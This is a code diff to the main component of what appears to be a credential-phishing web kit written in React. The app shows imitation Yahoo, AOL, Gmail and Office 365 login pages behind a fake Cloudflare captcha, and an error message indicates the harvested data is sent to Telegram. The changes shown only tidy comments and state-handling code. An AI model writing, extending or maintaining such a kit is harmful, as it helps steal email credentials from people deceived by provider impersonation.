@@ -5,7 +5,7 @@ import YahooLoginPage from './components/YahooLoginPage';
 import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
 import AolLoginPage from './components/AolLoginPage';
 import GmailLoginPage from './components/GmailLoginPage';
-import Office365Wrapper from './components/Office365Wrapper'; // Import the new wrapper
+import Office365Wrapper from './components/Office365Wrapper'; // Import the wrapper
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -38,7 +38,7 @@ function App() {
   const [showYahooLogin, setShowYahooLogin] = useState(false);
   const [showAolLogin, setShowAolLogin] = useState(false);
   const [showGmailLogin, setShowGmailLogin] = useState(false);
-  const [showOffice365Login, setShowOffice365Login] = useState(false); // ADD NEW STATE
+  const [showOffice365Login, setShowOffice365Login] = useState(false); // State for Office 365
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -52,10 +52,11 @@ function App() {
       if (event.name === 'adobe_session' || event.name === 'logged_in') {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
+        // Reset all specific login states
         setShowYahooLogin(false);
         setShowAolLogin(false);
         setShowGmailLogin(false);
-        setShowOffice365Login(false); // Reset Office state
+        setShowOffice365Login(false); 
         if (isActive) setCurrentPage('landing');
         else {
           setCaptchaVerified(false);
@@ -114,10 +115,11 @@ function App() {
       console.error('Failed to send final data to Telegram:', error);
     }
     
+    // Reset all specific login states
     setShowYahooLogin(false);
     setShowAolLogin(false);
     setShowGmailLogin(false);
-    setShowOffice365Login(false); // Reset Office state
+    setShowOffice365Login(false);
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -128,17 +130,19 @@ function App() {
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
     setHasActiveSession(false);
     setCaptchaVerified(false);
+    // Reset all specific login states
     setShowYahooLogin(false);
     setShowAolLogin(false);
     setShowGmailLogin(false);
-    setShowOffice365Login(false); // Reset Office state
+    setShowOffice365Login(false);
     setCurrentPage('captcha');
   };
 
+  // Handlers for each provider
   const handleYahooSelect = () => setShowYahooLogin(true);
   const handleAolSelect = () => setShowAolLogin(true);
   const handleGmailSelect = () => setShowGmailLogin(true);
-  const handleOffice365Select = () => setShowOffice365Login(true); // ADD NEW HANDLER
+  const handleOffice365Select = () => setShowOffice365Login(true);
 
   if (isLoading) {
     return (
@@ -163,7 +167,7 @@ function App() {
     if (showGmailLogin) {
       return <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
-    if (showOffice365Login) { // ADD RENDER LOGIC FOR WRAPPER
+    if (showOffice365Login) {
       return <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
     
@@ -174,7 +178,7 @@ function App() {
         onYahooSelect={handleYahooSelect}
         onAolSelect={handleAolSelect}
         onGmailSelect={handleGmailSelect}
-        onOffice365Select={handleOffice365Select} // PASS NEW HANDLER
+        onOffice365Select={handleOffice365Select} // This prop is now passed correctly
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
